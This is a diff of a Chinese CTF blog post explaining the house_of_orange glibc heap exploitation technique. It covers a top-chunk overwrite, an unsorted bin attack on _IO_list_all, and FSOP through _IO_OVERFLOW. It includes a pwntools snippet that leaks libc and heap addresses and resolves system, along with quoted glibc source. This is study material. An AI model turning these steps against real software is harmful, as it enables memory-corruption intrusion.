@@ -1,475 +1,179 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>house_of_orange - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="今天学习了下house_of_orange,总算是把house_of_orange给搞懂了 house_of_orange原理其实很简单，就是利用unsorted bin attack 和_IO_FILE利用的结合 这里涉及到的知识点有点多，是堆利用和IO_FILE利用的结合，所以要对两者都有一定的了解 直接拿house_of_orange这道经典的题来说吧 防护机制：  基本程序逻辑：一共有三个">
-<meta name="keywords" content="pwn,houseofxxx">
-<meta property="og:type" content="article">
-<meta property="og:title" content="house_of_orange">
-<meta property="og:url" content="http://yoursite.com/2018/09/19/2018-9-19-house_of_orange/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="今天学习了下house_of_orange,总算是把house_of_orange给搞懂了 house_of_orange原理其实很简单，就是利用unsorted bin attack 和_IO_FILE利用的结合 这里涉及到的知识点有点多，是堆利用和IO_FILE利用的结合，所以要对两者都有一定的了解 直接拿house_of_orange这道经典的题来说吧 防护机制：  基本程序逻辑：一共有三个">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/picture/1537441843635.png">
-<meta property="og:image" content="http://yoursite.com/picture/1537450312091.png">
-<meta property="og:image" content="http://yoursite.com/picture/1537450340051.png">
-<meta property="og:updated_time" content="2019-03-12T09:43:04.545Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="house_of_orange">
-<meta name="twitter:description" content="今天学习了下house_of_orange,总算是把house_of_orange给搞懂了 house_of_orange原理其实很简单，就是利用unsorted bin attack 和_IO_FILE利用的结合 这里涉及到的知识点有点多，是堆利用和IO_FILE利用的结合，所以要对两者都有一定的了解 直接拿house_of_orange这道经典的题来说吧 防护机制：  基本程序逻辑：一共有三个">
-<meta name="twitter:image" content="http://yoursite.com/picture/1537441843635.png">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2018/09/19/2018-9-19-house_of_orange/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>house_of_orange | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/19/2018-9-19-house_of_orange/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">house_of_orange
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-09-19 00:00:00" itemprop="dateCreated datePublished" datetime="2018-09-19T00:00:00+08:00">2018-09-19</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-03-12 17:43:04" itemprop="dateModified" datetime="2019-03-12T17:43:04+08:00">2019-03-12</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Heap-Exploitation/" itemprop="url" rel="index"><span itemprop="name">Heap_Exploitation</span></a></span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Wednesday, September 19th 2018, 12:00 am
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.8k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      8 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p>今天学习了下house_of_orange,总算是把house_of_orange给搞懂了</p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>今天学习了下house_of_orange,总算是把house_of_orange给搞懂了</p>
 <p>house_of_orange原理其实很简单，就是利用unsorted bin attack 和_IO_FILE利用的结合</p>
 <p>这里涉及到的知识点有点多，是堆利用和IO_FILE利用的结合，所以要对两者都有一定的了解</p>
 <p>直接拿house_of_orange这道经典的题来说吧</p>
 <p>防护机制：</p>
-<p><img src="/picture\1537441843635.png" alt="1537441843635"></p>
+<p><img src="/picture\1537441843635.png" srcset="/img/loading.gif" alt="1537441843635"></p>
 <p>基本程序逻辑：一共有三个功能</p>
 <ol>
 <li>build 创建一个house 输入housename的长度、内容、price、color的一些信息，并且它的将house更新为最新分配的house，所以我们只能对刚分配的house进行操作</li>
@@ -482,556 +186,480 @@
 <li>首先这个题没有free功能，所以要想办法可以生成一个unsorted bins的chunk，这里是通过堆溢出，修改top chunk的大小，使它变小，这里要注意top  chunk的size是有一些检查的，然后分配一个大小超出top chunk大小的chunk，这时根据申请的大小，会通过sysmalloc 来分配，如果申请的大小小于mmap的阀值的话，就会扩展top chunk，将old top chunk free掉，如果大于的话，就会通过mmap申请一块新的堆块。</li>
 </ul>
 <p>sysmalloc源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<span class="comment">/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">  try_mmap:</span><br><span class="line">  </span><br><span class="line">  .........</span><br><span class="line">  ..........</span><br><span class="line">    <span class="keyword">if</span> (old_size != <span class="number">0</span>)</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                       Shrink old_top to insert fenceposts, keeping size a</span></span><br><span class="line"><span class="comment">                       multiple of MALLOC_ALIGNMENT. We know there is at least</span></span><br><span class="line"><span class="comment">                       enough space in old_top to do this.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">                    set_head (old_top, old_size | PREV_INUSE);</span><br><span class="line">                    set_head (chunk_at_offset (old_top, old_size),</span><br><span class="line">                              (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                    set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ),</span><br><span class="line">                              (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                    <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line">                    <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">                      &#123;</span><br><span class="line">                        _int_free (av, old_top, <span class="number">1</span>);<span class="comment">/*将old top chunk free掉，加入unsorted bin*/</span></span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">   ...........省略了挺多的 具体可以自己去看源码</span><br></pre></td></tr></table></figure>
+<pre><code class="c">  if (av == NULL
+      || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)
+          &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/
+    {
+      char *mm;           /* return value from mmap call*/
+    try_mmap:
+
+    .........
+    ..........
+      if (old_size != 0)
+                    {
+                      /*
+                         Shrink old_top to insert fenceposts, keeping size a
+                         multiple of MALLOC_ALIGNMENT. We know there is at least
+                         enough space in old_top to do this.
+                       */
+                      old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;
+                      set_head (old_top, old_size | PREV_INUSE);
+                      set_head (chunk_at_offset (old_top, old_size),
+                                (2 * SIZE_SZ) | PREV_INUSE);
+                      set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ),
+                                (2 * SIZE_SZ) | PREV_INUSE);
+                      /* If possible, release the rest. */
+                      if (old_size &gt;= MINSIZE)
+                        {
+                          _int_free (av, old_top, 1);/*将old top chunk free掉，加入unsorted bin*/
+                        }
+                    }
+     ...........省略了挺多的 具体可以自己去看源码
+</code></pre>
 <ul>
 <li><p>能产生unsorted bin 之后，就要想着怎么泄露出libc地址了，libc地址很好泄露，但是heap的地址也要泄露出来，用于后面伪造_IO_FILE_plus结构体。这里的做法是，通过申请一个large bin大小的chunk，那么它的fd_nextsize和bk_nextsize中会存放自身的地址，通过这就可以泄露出堆地址</p>
 <p>具体做法是，是使用upgrade功能，将name依次更新为‘aaaaaaaa’及’a’*16 然后通过see功能就可以将地址打印出来</p>
 </li>
 </ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="number">0x400</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">123</span>,<span class="number">1</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak <span class="number">-1640</span>- <span class="number">0x3c4b20</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base address --&gt;[%s]"</span>%hex(libc_base)</span><br><span class="line"></span><br><span class="line">upgrade(<span class="number">0x400</span>,<span class="string">'a'</span>*<span class="number">16</span>,<span class="number">123</span>,<span class="number">1</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">leak_heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base = leak_heap - <span class="number">0xe0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak_heap --&gt;[%s]"</span>%hex(leak_heap)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_base --&gt;[%s]"</span>%hex(heap_base)</span><br><span class="line">_IO_list_all = libc.symbols[<span class="string">'_IO_list_all'</span>] + libc_base</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br></pre></td></tr></table></figure>
+<pre><code class="python">build(0x400,&#39;a&#39;*8,123,1)
+see()
+p.recvuntil(&quot;a&quot;*8)
+leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+libc_base = leak -1640- 0x3c4b20  
+print &quot;libc base address --&gt;[%s]&quot;%hex(libc_base)
+
+upgrade(0x400,&#39;a&#39;*16,123,1)
+see()
+p.recvuntil(&#39;a&#39;*16)
+leak_heap = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+heap_base = leak_heap - 0xe0
+print &quot;leak_heap --&gt;[%s]&quot;%hex(leak_heap)
+print &quot;heap_base --&gt;[%s]&quot;%hex(heap_base)
+_IO_list_all = libc.symbols[&#39;_IO_list_all&#39;] + libc_base
+system = libc.symbols[&#39;system&#39;] + libc_base
+</code></pre>
 <ul>
 <li><p>利用unsoted bin attack将 _IO_list_all 修改为 main_arena+88 这个很容易就实现，之后再分配一个chunk时会触发malloc_printerr</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">           || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">                                &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">         malloc_printerr (<span class="string">"malloc(): memory corruption"</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="c">   if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)
+              || __builtin_expect (chunksize_nomask (victim)
+                                   &gt; av-&gt;system_mem, 0))
+            malloc_printerr (&quot;malloc(): memory corruption&quot;);
+</code></pre>
 </li>
 <li><p>触发malloc_printerr后会调用一系列函数，最终调用 _IO_overflow函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数大致调用链</span><br><span class="line">malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</span><br><span class="line">而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure>
+<pre><code class="c">函数大致调用链
+malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW
+而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数
+#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
+</code></pre>
 <p>_IO_flush_all_lockp 源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<span class="comment">/*一些检查，需要绕过*/</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<span class="comment">/*也可以绕过这个*/</span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span></span><br><span class="line">        result = EOF;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">_IO_flush_all_lockp (int do_lock)
+{
+  int result = 0;
+  FILE *fp;
+#ifdef _IO_MTSAFE_IO
+  _IO_cleanup_region_start_noarg (flush_cleanup);
+  _IO_lock_lock (list_all_lock);
+#endif
+  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)
+    {
+      run_fp = fp;
+      if (do_lock)
+        _IO_flockfile (fp);
+      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/
+           || (_IO_vtable_offset (fp) == 0
+               &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
+                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/
+           )
+          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/
+        result = EOF;
+      if (do_lock)
+        _IO_funlockfile (fp);
+      run_fp = NULL;
+    }
+#ifdef _IO_MTSAFE_IO
+  _IO_lock_unlock (list_all_lock);
+  _IO_cleanup_region_end (0);
+#endif
+  return result;
+}
+</code></pre>
